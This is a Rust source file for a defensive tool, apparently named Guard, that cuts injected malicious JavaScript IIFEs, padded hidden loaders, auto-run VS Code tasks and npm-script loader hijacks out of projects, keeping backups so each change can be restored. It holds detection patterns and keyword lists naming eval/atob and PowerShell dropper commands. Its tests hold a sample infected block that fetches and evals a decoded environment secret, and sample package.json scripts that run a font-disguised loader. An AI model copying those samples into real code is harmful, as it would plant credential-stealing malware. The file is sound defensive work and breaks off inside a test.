//! `guard clean` / `guard restore` (port of remediator.py): cut injected
//! malicious IIFEs out of real source files, quarantine whole-file droppers,
//! drop auto-run settings and tasks from .vscode. Every change is backed up to
//! <guard_home>/quarantine first and recorded in index.jsonl, so `guard
//! restore` can put it back. Anything flagged that can't be cut out cleanly is
//! quarantined (backed up, then removed); nothing is left for manual review.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::LazyLock;
use std::time::{SystemTime, UNIX_EPOCH};

use regex::Regex;
use serde_json::{json, Map, Value};

use super::py;
use super::scanner::Scanner;
use crate::av::pystr;
use crate::deps::py_path_str;
use crate::pyjson;

// ---------------------------------------------------------------------------
// string/comment-aware bracket matching. Byte offsets: every byte that matters
// is ASCII, so this cuts at the same characters as Python's str indexing.
// ---------------------------------------------------------------------------

fn skip_string(s: &[u8], mut i: usize, quote: u8) -> usize {
    i += 1;
    while i < s.len() {
        match s[i] {
            b'\\' => i += 2,
            c if c == quote => return i + 1,
            _ => i += 1,
        }
    }
    s.len()
}

fn skip_line_comment(s: &[u8], mut i: usize) -> usize {
    while i < s.len() && s[i] != b'\n' {
        i += 1;
    }
    i
}

fn skip_block_comment(s: &[u8], mut i: usize) -> usize {
    i += 2;
    while i < s.len() {
        if s[i] == b'*' && i + 1 < s.len() && s[i + 1] == b'/' {
            return i + 2;
        }
        i += 1;
    }
    s.len()
}

/// s[i] is '`': the index after the closing backtick, handling ${ ... }.
fn skip_template(s: &[u8], mut i: usize) -> usize {
    let n = s.len();
    i += 1;
    while i < n {
        match s[i] {
            b'\\' => {
                i += 2;
                continue;
            }
            b'`' => return i + 1,
            b'$' if i + 1 < n && s[i + 1] == b'{' => {
                i += 2;
                let mut depth = 1;
                while i < n && depth > 0 {
                    let c = s[i];
                    if c == b'\\' {
                        i += 2;
                        continue;
                    }
                    if c == b'\'' || c == b'"' {
                        i = skip_string(s, i, c);
                        continue;
                    }
                    if c == b'`' {
                        i = skip_template(s, i);
                        continue;
                    }
                    if c == b'{' {
                        depth += 1;
                    } else if c == b'}' {
                        depth -= 1;
                    }
                    i += 1;
                }
                continue;
            }
            _ => {}
        }
        i += 1;
    }
    n
}

/// Strings, templates and comments to skip at `i`: the index after them.
fn skip_any(s: &[u8], i: usize) -> Option<usize> {
    let c = s[i];
    if c == b'\'' || c == b'"' {
        return Some(skip_string(s, i, c));
    }
    if c == b'`' {
        return Some(skip_template(s, i));
    }
    if c == b'/' && i + 1 < s.len() {
        if s[i + 1] == b'/' {
            return Some(skip_line_comment(s, i));
        }
        if s[i + 1] == b'*' {
            return Some(skip_block_comment(s, i));
        }
    }
    None
}

/// The index of the bracket matching s[i], if balanced.
fn matching_bracket(s: &[u8], mut i: usize) -> Option<usize> {
    let open = s[i];
    let close = match open {
        b'(' => b')',
        b'{' => b'}',
        _ => b']',
    };
    let mut depth = 0i64;
    while i < s.len() {
        if let Some(j) = skip_any(s, i) {
            i = j;
            continue;
        }
        let c = s[i];
        if c == open {
            depth += 1;
        } else if c == close {
            depth -= 1;
            if depth == 0 {
                return Some(i);
            }
        }
        i += 1;
    }
    None
}

fn brackets_balanced(s: &[u8]) -> bool {
    let mut stack = vec![];
    let mut i = 0;
    while i < s.len() {
        if let Some(j) = skip_any(s, i) {
            i = j;
            continue;
        }
        match s[i] {
            c @ (b'(' | b'[' | b'{') => stack.push(c),
            c @ (b')' | b']' | b'}') => {
                let want = match c {
                    b')' => b'(',
                    b']' => b'[',
                    _ => b'{',
                };
                if stack.pop() != Some(want) {
                    return false;
                }
            }
            _ => {}
        }
        i += 1;
    }
    stack.is_empty()
}

// ---------------------------------------------------------------------------
// locate + excise malicious IIFEs
// ---------------------------------------------------------------------------

static IIFE_OPEN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(&py::translate(
        r"\(\s*(?:async\b\s*)?(?:function\b|\([^()]*\)\s*=>|[A-Za-z_$][\w$]*\s*=>)",
    ))
    .unwrap()
});

/// Markers of a malicious IIFE. Stored reversed: plain in the binary, they
/// would match Guard's own signatures.
const STRONG_MARKERS_REV: &[&str] = &[
    "vne.ssecorp(bota",
    "ofnIyxorp(lave",
    "bota(lave",
    "YEK_IPA_HTUA",
    "ppa.lecrev.net-mrifnoc-htua",
];

fn iife_is_malicious(body: &str) -> bool {
    let strong = STRONG_MARKERS_REV
        .iter()
        .map(|m| m.chars().rev().collect::<String>())
        .any(|m| body.contains(&m));
    strong
        || (body.contains("eval(")
            && (body.contains("node-fetch")
                || body.contains("process.env")
                || body.contains("atob(")))
}

/// (start, end) of the top-level malicious IIFEs, non-overlapping.
pub fn find_malicious_iifes(text: &str) -> Vec<(usize, usize)> {
    let b = text.as_bytes();
    let mut spans: Vec<(usize, usize)> = vec![];
    for m in IIFE_OPEN.find_iter(text) {
        let i = m.start();
        if spans.iter().any(|&(a, e)| a <= i && i < e) {
            continue;
        }
        let Some(j) = matching_bracket(b, i) else {
            continue;
        };
        let mut k = j + 1;
        while k < b.len() && matches!(b[k], b' ' | b'\t' | b'\r' | b'\n') {
            k += 1;
        }
        if k >= b.len() || b[k] != b'(' {
            continue;
        }
        let Some(m2) = matching_bracket(b, k) else {
            continue;
        };
        let mut end = m2 + 1;
        if end < b.len() && b[end] == b';' {
            end += 1;
        }
        if iife_is_malicious(&text[i..end]) {
            spans.push((i, end));
        }
    }
    spans
}

/// The text without its malicious IIFEs (and the blank space they leave),
/// plus the removed blocks.
pub fn strip_malicious_iife(text: &str) -> (String, Vec<String>) {
    let mut spans = find_malicious_iifes(text);
    if spans.is_empty() {
        return (text.to_string(), vec![]);
    }
    spans.sort();
    let mut out = text.to_string();
    let mut removed = vec![];
    for &(i, end) in spans.iter().rev() {
        removed.push(out[i..end].to_string());
        let ls = out[..i].rfind('\n').map_or(0, |p| p + 1);
        let seg_start = if pystr::strip(&out[ls..i]).is_empty() {
            ls
        } else {
            i
        };
        let ob = out.as_bytes();
        let mut seg_end = end;
        while seg_end < ob.len() && (ob[seg_end] == b' ' || ob[seg_end] == b'\t') {
            seg_end += 1;
        }
        if seg_end < ob.len() && ob[seg_end] == b'\n' {
            seg_end += 1;
        }
        out.replace_range(seg_start..seg_end, "");
    }
    static BLANKS: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\n{3,}").unwrap());
    (BLANKS.replace_all(&out, "\n\n").into_owned(), removed)
}

/// Bootstrap marker of the `_0x` loader wave (issue #24), e.g. a
/// `global['!']`, `global["!"]` or `global.i` assignment of a short campaign
/// tag such as 9-6600 or A10-1300.
static LOADER_MARKER: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"\bglobal(?:\['!'\]|\["!"\]|\.i)\s*=\s*['"]A?\d{1,3}(?:-[0-9*]{1,6}){0,3}['"]"#)
        .unwrap()
});

static PREFIXED_0X: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^function\s+a\d{1,3}_0x[0-9a-f]{4,6}\s*\(").unwrap());

/// Whitespace the loader is pushed past, so it sits off-screen in an editor.
const LOADER_PAD: usize = 64;

/// Code pushed off-screen by 150+ blanks, whatever it is named (the
/// `hidden.padded.code` signature): the blanks start after a visible
/// character or at the start of a line.
static HIDDEN_CODE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?m)(?:^|[^\x00-\x20\x7f])([ \t]{150,}(?:[A-Za-z_$(\[!;+~{'"`\\-]|/[^/]).*)"#)
        .unwrap()
});

#[derive(Debug, PartialEq)]
pub enum LoaderFix {
    /// No loader marker and no padded hidden code.
    None,
    /// The marker is the first thing in the file: the whole file is the loader.
    Whole,
    /// The real file with the padded loader cut out.
    Cut(String),
    /// A marker or hidden code in a place this can't cut safely.
    Unsafe,
}

/// Find the `_0x` loader appended after a long run of spaces on the last line
/// of a real config file, and the file without it.
pub fn strip_padded_loader(text: &str) -> LoaderFix {
    let Some(m) = LOADER_MARKER.find(text) else {
        // no marker, but the file opens with a prefixed obfuscator function
        // (a0_0x12d6): no developer writes that by hand, the file is the loader
        let start = text.trim_start_matches('\u{feff}').trim_start();
        return if PREFIXED_0X.is_match(start) {
            LoaderFix::Whole
        } else {
            cut_hidden_code(text)
        };
    };
    let head = &text[..m.start()];
    let tail = &text[m.start()..];
    if head.trim_start_matches('\u{feff}').trim().is_empty() {
        // no real file opens with the campaign marker: the whole file is
        // the payload, _0x body or not (quarantine keeps a backup)
        return LoaderFix::Whole;
    }
    let real = head.trim_end_matches([' ', '\t']);
    if head.len() - real.len() < LOADER_PAD
        || real.ends_with(['\n', '\r'])
        || tail.trim_end().contains('\n')
        || !tail.contains("_0x")
    {
        return LoaderFix::Unsafe;
    }
    let nl = if text.ends_with("\r\n") {
        "\r\n"
    } else if text.ends_with('\n') {
        "\n"
    } else {
        ""
    };
    let new = format!("{real}{nl}");
    if LOADER_MARKER.is_match(&new) || !brackets_balanced(new.as_bytes()) {
        return LoaderFix::Unsafe;
    }
    LoaderFix::Cut(new)
}

/// Cut every padded tail (blanks to end of line) out of `text`. A line that
/// held nothing but the padded code goes too. Each cut piece and the result
/// must have balanced brackets, else the bounds are unclear.
fn cut_hidden_code(text: &str) -> LoaderFix {
    let mut out = String::with_capacity(text.len());
    let mut last = 0;
    let mut found = false;
    for c in HIDDEN_CODE.captures_iter(text) {
        let tail = c.get(1).unwrap();
        // `.*` stops before "\n", so keep a CRLF's "\r"
        let end = if tail.as_str().ends_with('\r') {
            tail.end() - 1
        } else {
            tail.end()
        };
        if !brackets_balanced(&text.as_bytes()[tail.start()..end]) {
            return LoaderFix::Unsafe;
        }
        found = true;
        let line_start = text[..tail.start()].rfind('\n').map_or(0, |i| i + 1);
        if line_start == tail.start() {
            // the whole line was the hidden code: drop it with its newline
            out.push_str(&text[last..line_start]);
            let rest = &text[end..];
            last = end
                + if rest.starts_with("\r\n") {
                    2
                } else {
                    usize::from(rest.starts_with('\n'))
                };
        } else {
            out.push_str(&text[last..tail.start()]);
            last = end;
        }
    }
    if !found {
        return LoaderFix::None;
    }
    out.push_str(&text[last..]);
    if HIDDEN_CODE.is_match(&out) || !brackets_balanced(out.as_bytes()) {
        return LoaderFix::Unsafe;
    }
    LoaderFix::Cut(out)
}

// ---------------------------------------------------------------------------
// tolerant JSONC (string-aware)
// ---------------------------------------------------------------------------

fn strip_jsonc(text: &str) -> String {
    let b = text.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        if c == b'"' || c == b'\'' {
            let j = skip_string(b, i, c).min(b.len());
            out.extend_from_slice(&b[i..j]);
            i = j;
            continue;
        }
        if c == b'/' && i + 1 < b.len() && b[i + 1] == b'/' {
            i = skip_line_comment(b, i);
            continue;
        }
        if c == b'/' && i + 1 < b.len() && b[i + 1] == b'*' {
            i = skip_block_comment(b, i);
            continue;
        }
        out.push(c);
        i += 1;
    }
    // comments end on ASCII, so the bytes are still UTF-8
    let s = String::from_utf8_lossy(&out).into_owned();
    static TRAILING: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r",([\s\x1c-\x1f]*[}\]])").unwrap());
    TRAILING.replace_all(&s, "$1").into_owned()
}

fn load_jsonc(p: &Path) -> Option<Value> {
    let text = py::read_text(p).ok()?;
    serde_json::from_str(&strip_jsonc(&text)).ok()
}

// ---------------------------------------------------------------------------
// the remediator
// ---------------------------------------------------------------------------

pub const SCRIPT_EXTS: &[&str] = &[".js", ".mjs", ".cjs", ".ts", ".jsx", ".tsx"];
const BINARY_EXTS: &[&str] = &[
    ".woff2", ".woff", ".ttf", ".otf", ".png", ".jpg", ".jpeg", ".ico", ".gif", ".webp",
];

fn now() -> (u64, u32) {
    let d = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default();
    (d.as_secs(), d.subsec_micros())
}

/// "%Y%m%dT%H%M%SZ" in UTC.
fn compact_ts(secs: u64) -> String {
    let iso = crate::util::iso_utc(secs as i64, 0);
    let digits: String = iso[..19]
        .chars()
        .filter(|c| *c != '-' && *c != ':')
        .collect();
    format!("{digits}Z")
}

fn obj(v: Value) -> Map<String, Value> {
    match v {
        Value::Object(m) => m,
        _ => unreachable!(),
    }
}

pub struct Remediator {
    qdir: PathBuf,
    index: PathBuf,
}

impl Remediator {
    pub fn new(home: &Path) -> Remediator {
        let qdir = home.join("quarantine");
        let _ = fs::create_dir_all(&qdir);
        Remediator {
            index: qdir.join("index.jsonl"),
            qdir,
        }
    }

    fn log(&self, msg: &str) {
        crate::util::emit(msg);
    }

    fn backup(&self, path: &str) -> Result<(PathBuf, String), String> {
        let data = fs::read(path).map_err(|e| pystr::os_error(&e, path))?;
        let sha = py::sha256_hex(&data);
        let safe = py::safe_name(path);
        let safe = safe.trim_matches('_');
        let dest = self
            .qdir
            .join(format!("{}__{safe}.{}.bak", compact_ts(now().0), &sha[..8]));
        fs::write(&dest, &data).map_err(|e| pystr::os_error(&e, &dest.to_string_lossy()))?;
        Ok((dest, sha))
    }

    fn record(
        &self,
        action: &str,
        path: &str,
        backup: Option<&Path>,
        before: Value,
        after: Value,
        detail: &str,
    ) {
        let (secs, micros) = now();
        let rec = json!({
            "ts": crate::util::iso_utc(secs as i64, micros),
            "action": action,
            "path": path,
            "backup": backup.map(|b| b.to_string_lossy().into_owned()),
            "sha_before": before,
            "sha_after": after,
            "detail": detail,
        });
        let line = format!("{}\n", pyjson::dumps(&rec, None, false));
        if let Ok(mut f) = fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.index)
        {
            let _ = f.write_all(&py::text_bytes(&line));
        }
    }

    fn name_of(p: &Path) -> String {
        p.file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default()
    }

    fn quarantine_file(&self, path: &str, reason: &str) -> Result<Value, String> {
        if crate::util::is_system_path(path) {
            self.log(&format!(
                "remediate: not quarantining {path} (operating-system directory)"
            ));
            return Ok(json!({"action": "system", "path": path,
                "note": "flagged inside an operating-system directory; not removed"}));
        }
        let (backup, sha) = self.backup(path)?;
        if let Err(e) = fs::remove_file(path) {
            return Ok(
                json!({"action": "error", "path": path, "error": pystr::os_error(&e, path)}),
            );
        }
        self.record(
            "quarantine",
            path,
            Some(&backup),
            json!(sha),
            Value::Null,
            reason,
        );
        self.log(&format!(
            "remediate: quarantined dropper {path} -> {}",
            Self::name_of(&backup)
        ));
        Ok(
            json!({"action": "quarantine", "path": path, "backup": backup.to_string_lossy(), "reason": reason}),
        )
    }

    fn neutralize_js(&self, path: &str) -> Result<Option<Value>, String> {
        let Ok(text) = py::read_text(Path::new(path)) else {
            return Ok(None);
        };
        let (new, removed) = strip_malicious_iife(&text);
        if removed.is_empty() {
            return Ok(None);
        }
        if !brackets_balanced(new.as_bytes()) {
            return self
                .quarantine_file(path, "injected block with unclear bounds")
                .map(Some);
        }
        let (backup, before) = self.backup(path)?;
        py::write_text(Path::new(path), &new).map_err(|e| pystr::os_error(&e, path))?;
        let after = py::sha256_hex(new.as_bytes());
        let n = removed.len();
        self.record(
            "neutralize",
            path,
            Some(&backup),
            json!(before),
            json!(after),
            &format!("removed {n} injected block(s)"),
        );
        self.log(&format!(
            "remediate: excised {n} injected block(s) from {path} (kept the real code)"
        ));
        Ok(Some(
            json!({"action": "neutralize", "path": path, "blocks": n, "backup": backup.to_string_lossy()}),
        ))
    }

    fn strip_loader(&self, path: &str) -> Result<Option<Value>, String> {
        let Ok(text) = py::read_text(Path::new(path)) else {
            return Ok(None);
        };
        match strip_padded_loader(&text) {
            LoaderFix::None => Ok(None),
            LoaderFix::Whole => self.quarantine_file(path, "whole-file loader").map(Some),
            LoaderFix::Unsafe => self
                .quarantine_file(path, "hidden loader with unclear bounds")
                .map(Some),
            LoaderFix::Cut(new) => {
                let (backup, before) = self.backup(path)?;
                py::write_text(Path::new(path), &new).map_err(|e| pystr::os_error(&e, path))?;
                let after = py::sha256_hex(new.as_bytes());
                self.record(
                    "neutralize",
                    path,
                    Some(&backup),
                    json!(before),
                    json!(after),
                    "removed padded hidden loader",
                );
                self.log(&format!(
                    "remediate: cut padded hidden loader from {path} (kept the real code)"
                ));
                Ok(Some(
                    json!({"action": "neutralize", "path": path, "blocks": 1, "backup": backup.to_string_lossy()}),
                ))
            }
        }
    }

    fn write_json(&self, path: &str, data: &Value) -> Result<String, String> {
        let new = format!("{}\n", pyjson::dumps(data, Some(2), false));
        py::write_text(Path::new(path), &new).map_err(|e| pystr::os_error(&e, path))?;
        Ok(py::sha256_hex(new.as_bytes()))
    }

    fn clean_vscode_settings(&self, path: &str) -> Result<Option<Value>, String> {
        let Some(Value::Object(mut data)) = load_jsonc(Path::new(path)) else {
            return Ok(None);
        };
        if !data.contains_key("task.allowAutomaticTasks") {
            return Ok(None);
        }
        let (backup, before) = self.backup(path)?;
        data.shift_remove("task.allowAutomaticTasks");
        let after = self.write_json(path, &Value::Object(data))?;
        self.record(
            "clean-settings",
            path,
            Some(&backup),
            json!(before),
            json!(after),
            "removed task.allowAutomaticTasks",
        );
        self.log(&format!("remediate: removed auto-run flag from {path}"));
        Ok(Some(
            json!({"action": "clean-settings", "path": path, "backup": backup.to_string_lossy()}),
        ))
    }

    fn task_is_malicious(task: &Map<String, Value>) -> bool {
        let mut runon = String::new();
        if let Some(Value::Object(ro)) = task.get("runOptions") {
            runon = ro
                .get("runOn")
                .map(pystr::py_str)
                .unwrap_or_default()
                .to_lowercase();
        }
        let blob = pyjson::dumps(&Value::Object(task.clone()), None, false).to_lowercase();
        let auto = runon == "folderopen" || blob.contains("\"runon\": \"folderopen\"");
        let bad = [
            "public/fonts",
            ".woff2",
            "node ./",
            "atob(",
            "eval(",
            "invoke-expression",
            "iex ",
            "powershell -e",
        ]
        .iter()
        .any(|k| blob.contains(k));
        // an auto-run task is the attack's trigger, and a dropper-like
        // command is the payload: either one goes
        auto || bad
    }

    fn clean_vscode_tasks(&self, path: &str) -> Result<Option<Value>, String> {
        let Some(Value::Object(mut data)) = load_jsonc(Path::new(path)) else {
            return Ok(None);
        };
        let Some(Value::Array(tasks)) = data.get("tasks") else {
            return Ok(None);
        };
        let mut kept = vec![];
        let mut dropped = 0;
        for t in tasks {
            match t {
                Value::Object(o) if Self::task_is_malicious(o) => dropped += 1,
                _ => kept.push(t.clone()),
            }
        }
        if dropped == 0 {
            return Ok(None);
        }
        let (backup, before) = self.backup(path)?;
        data.insert("tasks".into(), Value::Array(kept));
        let after = self.write_json(path, &Value::Object(data))?;
        self.record(
            "clean-tasks",
            path,
            Some(&backup),
            json!(before),
            json!(after),
            &format!("removed {dropped} auto-run task(s)"),
        );
        self.log(&format!(
            "remediate: removed {dropped} malicious auto-run task(s) from {path}"
        ));
        Ok(Some(
            json!({"action": "clean-tasks", "path": path, "dropped": dropped, "backup": backup.to_string_lossy()}),
        ))
    }

    /// package.json: cut a `node <loader> && ` prefix out of npm scripts when
    /// the loader is a disguised asset (font/image) or the campaign's root
    /// api.js. Never quarantines package.json: the project must keep working.
    fn clean_package_json(&self, path: &str) -> Result<Value, String> {
        static HIJACK: LazyLock<Regex> = LazyLock::new(|| {
            Regex::new(r#"("[^"\n]{1,64}"\s*:\s*")\s*node\s+(?:\./)?(?:api\.js|[^"&|;\s]*\.(?:woff2?|ttf|otf|eot|svg|png|jpe?g|gif|ico|bmp|webp))\s*&&\s*"#).unwrap()
        });
        let Ok(text) = py::read_text(Path::new(path)) else {
            return Ok(json!({"action": "noop", "path": path}));
        };
        let n = HIJACK.find_iter(&text).count();
        if n == 0 {
            return Ok(json!({"action": "noop", "path": path}));
        }
        let new = HIJACK.replace_all(&text, "$1").into_owned();
        let (backup, before) = self.backup(path)?;
        py::write_text(Path::new(path), &new).map_err(|e| pystr::os_error(&e, path))?;
        self.record(
            "neutralize",
            path,
            Some(&backup),
            json!(before),
            json!(py::sha256_hex(new.as_bytes())),
            "removed hidden loader from npm scripts",
        );
        self.log(&format!("remediate: removed {n} hidden loader call(s) from npm scripts in {path}"));
        Ok(json!({"action": "neutralize", "path": path, "blocks": n, "backup": backup.to_string_lossy()}))
    }

    pub fn remediate_file(&self, path_arg: &str, is_dropper: bool) -> Result<Value, String> {
        let path = py_path_str(path_arg);
        let p = Path::new(&path);
        if !p.exists() {
            return Ok(json!({"action": "gone", "path": path}));
        }
        let parent = pystr::name(&path[..path.len() - pystr::name(&path).len()]).to_lowercase();
        let name = pystr::name(&path).to_lowercase();
        if parent == ".vscode" && name == "settings.json" {
            return Ok(self
                .clean_vscode_settings(&path)?
                .unwrap_or_else(|| json!({"action": "noop", "path": path})));
        }
        if parent == ".vscode" && (name == "tasks.json" || name == "launch.json") {
            return Ok(self
                .clean_vscode_tasks(&path)?
                .unwrap_or_else(|| json!({"action": "noop", "path": path})));
        }
        if name == "package.json" {
            return self.clean_package_json(&path);
        }
        if is_dropper {
            return self.quarantine_file(&path, "whole-file dropper / masquerade payload");
        }
        if SCRIPT_EXTS.contains(&pystr::suffix(&path).to_lowercase().as_str()) {
            if let Some(r) = self.neutralize_js(&path)? {
                return Ok(r);
            }
            if let Some(r) = self.strip_loader(&path)? {
                return Ok(r);
            }
        }
        // flagged and not cleanly cut out: quarantine it (backed up first)
        self.quarantine_file(&path, "flagged file with no safe in-place fix")
    }

    /// `guard clean <file>`: VS Code files go to their config cleaners; any
    /// other file is scanned first and quarantined or cut only when flagged.
    pub fn clean_file(&self, path_arg: &str) -> Result<Value, String> {
        let path = py_path_str(path_arg);
        let parent = pystr::name(&path[..path.len() - pystr::name(&path).len()]).to_lowercase();
        if parent == ".vscode" || pystr::name(&path).eq_ignore_ascii_case("package.json") {
            return self.remediate_file(&path, false);
        }
        let sig = super::sigs::load(None)?;
        let mut sc = Scanner::new(&sig, true)?;
        let ext = pystr::suffix(&path).to_lowercase();
        let mut flagged = BINARY_EXTS.contains(&ext.as_str())
            && sc
                .magic
                .check_file(&path)
                .iter()
                .any(|f| matches!(f.severity, "critical" | "high"));
        if !flagged {
            if let Some(text) = super::scanner::read_text_capped(Path::new(&path)) {
                flagged = sc
                    .matcher
                    .scan_content(&path, &text)
                    .iter()
                    .any(|f| crit(&json!({"severity": f.severity, "sig_id": f.sig_id})));
            }
        }
        let av = sc.av_scan_file(&path, &path);
        if !flagged && av.is_none() {
            return Ok(json!({"action": "noop", "path": path}));
        }
        let whole = BINARY_EXTS.contains(&ext.as_str())
            || (av.is_some() && !SCRIPT_EXTS.contains(&ext.as_str()));
        self.remediate_file(&path, whole)
    }

    /// Detect with the scanner, then remediate every flagged file.
    pub fn clean_repo(&self, repo: &str) -> Result<Value, String> {
        let sig = super::sigs::load(None)?;
        let mut sc = Scanner::new(&sig, true)?;
        let mut summary = obj(json!({"repo": repo, "neutralized": [], "quarantined": [],
            "config_cleaned": [], "system": [], "noop": []}));
        let mut seen: Vec<String> = vec![];
        let route = |summary: &mut Map<String, Value>, res: Value| {
            let act = res.get("action").and_then(Value::as_str).unwrap_or("");
            let bucket = match act {
                "neutralize" => "neutralized",
                "quarantine" => "quarantined",
                "clean-settings" | "clean-tasks" => "config_cleaned",
                "system" => "system",
                _ => "noop",
            };
            let path = res.get("path").cloned().unwrap_or(json!(""));
            if let Some(Value::Array(a)) = summary.get_mut(bucket) {
                a.push(path);
            }
        };
        let abs = |rel: Option<&Value>| -> Option<String> {
            let rel = rel.and_then(Value::as_str).filter(|s| !s.is_empty())?;
            Some(if Path::new(rel).is_absolute() {
                py_path_str(rel)
            } else {
                py::join(repo, rel)
            })
        };

        // 1. .vscode auto-run
        let (_, vf) = sc.vscode.is_safe_to_open(repo);
        for f in vf
            .iter()
            .filter(|f| matches!(f.severity, "critical" | "high"))
        {
            if let Some(fp) = abs(Some(&json!(f.path))) {
                if !seen.contains(&fp) {
                    seen.push(fp.clone());
                    route(&mut summary, self.remediate_file(&fp, false)?);
                }
            }
        }

        // 2. tree: masquerade droppers + injections / payloads; 3. av engine:
        // whole-file threats are quarantined, code inside a real source file
        // goes to the excise-or-manual path.
        let res = sc.scan_tree(repo);
        let bucket = |k: &str| {
            res.get(k)
                .and_then(Value::as_array)
                .cloned()
                .unwrap_or_default()
        };
        for x in bucket("magic").iter().filter(|x| crit(x)) {
            if let Some(fp) = abs(x.get("path").or(x.get("where"))) {
                if !seen.contains(&fp) {
                    seen.push(fp.clone());
                    route(&mut summary, self.remediate_file(&fp, true)?);
                }
            }
        }
        for x in bucket("fingerprint").iter().filter(|x| crit(x)) {
            let Some(fp) = abs(x.get("where").or(x.get("path"))) else {
                continue;
            };
            if seen.contains(&fp) {
                continue;
            }
            seen.push(fp.clone());
            let dropper = BINARY_EXTS.contains(&pystr::suffix(&fp).to_lowercase().as_str());
            route(&mut summary, self.remediate_file(&fp, dropper)?);
        }
        for x in bucket("av").iter().filter(|x| crit(x)) {
            let Some(fp) = abs(x.get("path").or(x.get("where"))) else {
                continue;
            };
            if seen.contains(&fp) {
                continue;
            }
            seen.push(fp.clone());
            // a script gets the excise attempt first; anything else goes whole
            let whole = !SCRIPT_EXTS.contains(&pystr::suffix(&fp).to_lowercase().as_str());
            route(&mut summary, self.remediate_file(&fp, whole)?);
        }
        Ok(Value::Object(summary))
    }

    /// Put back the most recent backup of an original path (or a backup name).
    pub fn restore(&self, target: &str) -> Result<Value, String> {
        if !self.index.exists() {
            return Ok(json!({"restored": [], "error": "no quarantine index"}));
        }
        let text = py::read_text(&self.index)
            .map_err(|e| pystr::os_error(&e, &self.index.to_string_lossy()))?;
        let mut recs = vec![];
        for line in py::splitlines(&text) {
            if pystr::strip(line).is_empty() {
                continue;
            }
            let rec: Value =
                serde_json::from_str(line).map_err(|e| format!("{}: {e}", self.index.display()))?;
            recs.push(rec);
        }
        let matches = |r: &Value| {
            r.get("path").and_then(Value::as_str) == Some(target)
                || r.get("backup")
                    .and_then(Value::as_str)
                    .filter(|b| !b.is_empty())
                    .is_some_and(|b| pystr::name(b) == target)
        };
        let Some(r) = recs.iter().rev().find(|r| matches(r)) else {
            return Ok(json!({"restored": [], "error": format!("no record for {target}")}));
        };
        let backup = r.get("backup").and_then(Value::as_str).unwrap_or("");
        if backup.is_empty() || !Path::new(backup).exists() {
            return Ok(json!({"restored": [], "error": "backup file missing"}));
        }
        let dest = py_path_str(r.get("path").and_then(Value::as_str).unwrap_or(""));
        if let Some(parent) = Path::new(&dest)
            .parent()
            .filter(|p| !p.as_os_str().is_empty())
        {
            fs::create_dir_all(parent)
                .map_err(|e| pystr::os_error(&e, &parent.to_string_lossy()))?;
        }
        let data = fs::read(backup).map_err(|e| pystr::os_error(&e, backup))?;
        fs::write(&dest, data).map_err(|e| pystr::os_error(&e, &dest))?;
        let bpath = PathBuf::from(py_path_str(backup));
        let before = r.get("sha_before").cloned().unwrap_or(Value::Null);
        self.record(
            "restore",
            &dest,
            Some(&bpath),
            Value::Null,
            before,
            "restored from backup",
        );
        self.log(&format!(
            "remediate: restored {dest} from {}",
            pystr::name(backup)
        ));
        Ok(json!({"restored": [dest], "from": backup}))
    }
}

/// Anything that looks like malware: every finding but a bad font header
/// ("low") and a workflow that is flagged only for its common file name.
pub fn crit(v: &Value) -> bool {
    matches!(
        v.get("severity").and_then(Value::as_str),
        Some("critical" | "high" | "medium")
    ) && v.get("sig_id").and_then(Value::as_str) != Some("wf.name")
}

/// remediator.main: `guard clean [<path>]`, `guard restore <path|backup>`.
pub fn main(argv: &[String]) -> Result<u8, String> {
    let (sub, rest) = argv.split_first().ok_or("usage")?;
    let rem = Remediator::new(&crate::util::guard_home());
    if sub == "restore" {
        let Some(target) = rest.first() else {
            eprintln!("usage: guard restore <original-path|backup-name>");
            return Ok(2);
        };
        println!("{}", pyjson::dumps(&rem.restore(target)?, Some(2), false));
        return Ok(0);
    }
    let target = if sub != "clean" {
        sub.as_str()
    } else {
        rest.first().map_or(".", String::as_str)
    };
    let out = if Path::new(target).is_file() {
        rem.clean_file(target)?
    } else {
        rem.clean_repo(target)?
    };
    println!("{}", pyjson::dumps(&out, Some(2), false));
    Ok(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    const INFECTED: &str = "import x from 'y';\n\n(async () => {\n  const u = atob(process.env.AUTH_API_KEY);\n  const r = await fetch(u); eval(proxyInfo);\n})();\n\nexport default { a: \"(\" };\n";

    #[test]
    fn package_json_hidden_loader_is_cut_not_quarantined() {
        let t = std::env::temp_dir().join(format!("guard-pkg-{}", std::process::id()));
        let _ = fs::remove_dir_all(&t);
        fs::create_dir_all(t.join("home")).unwrap();
        let pkg = t.join("package.json");
        let api = ["node api", ".js && next dev"].concat();
        let font = ["node ./public/fonts/x", ".otf && nodemon src/index.js"].concat();
        fs::write(&pkg, format!("{{\n  \"scripts\": {{\n    \"dev\": \"{api}\",\n    \"start\": \"{font}\",\n    \"build\": \"node build.js && tsc\"\n  }}\n}}\n")).unwrap();
        let rem = Remediator::new(&t.join("home"));
        let p = pkg.to_string_lossy().into_owned();
        let r = rem.remediate_file(&p, true).unwrap();
        assert_eq!(r["action"], "neutralize");
        assert_eq!(r["blocks"], 2);
        let after = fs::read_to_string(&pkg).unwrap();
        assert!(after.contains("\"dev\": \"next dev\""), "{after}");
        assert!(after.contains("\"start\": \"nodemon src/index.js\""), "{after}");
        assert!(after.contains("node build.js && tsc"), "a legit build step stays: {after}");
        // already clean: nothing to do, and never a quarantine
        assert_eq!(rem.remediate_file(&p, true).unwrap()["action"], "noop");
        assert!(pkg.exists());
        let _ = fs::remove_dir_all(&t);
    }

    #[test]
    fn excises_the_iife_only() {
        let (new, removed) = strip_malicious_iife(INFECTED);
        assert_eq!(removed.len(), 1);
        assert_eq!(new, "import x from 'y';\n\nexport default { a: \"(\" };\n");
        assert!(brackets_balanced(new.as_bytes()));
        assert!(find_malicious_iifes("(() => { console.log(1) })();").is_empty());
    }

    #[test]
    fn brackets_skip_strings_and_comments() {
